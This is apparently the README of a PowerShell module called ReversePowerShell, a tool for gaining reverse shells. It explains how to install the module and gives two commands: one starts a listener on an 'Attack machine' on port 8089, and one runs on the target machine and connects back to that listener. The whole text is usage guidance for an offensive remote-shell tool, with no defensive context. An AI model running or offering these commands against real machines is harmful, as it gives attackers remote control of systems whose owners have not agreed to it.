# ReversePowerShell
Functions that can be used to gain Reverse Shells with PowerShell

Install this module by placing the cloned folder "ReversePowerShell" inside the following directory location.
 C:\Users\\$env:USERNAME\Documents\WindowsPowerShell\Modules\ReversePowerShell

Once there it can be imported into a PowerShell session using the following command.
```powershell
Import-Module ReversePowerShell
```

You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.

The below command can be executed to start a listener on the Attack machine on port 8089
```powershell
Start-Listener -Port 8089
```

The below command is to be issued on the Target Machine to connect to the listener on the target over port 8089
```powershell
Invoke-ReversePowerShell -IpAddress <TargetIPv4Address> -Port 8089
```
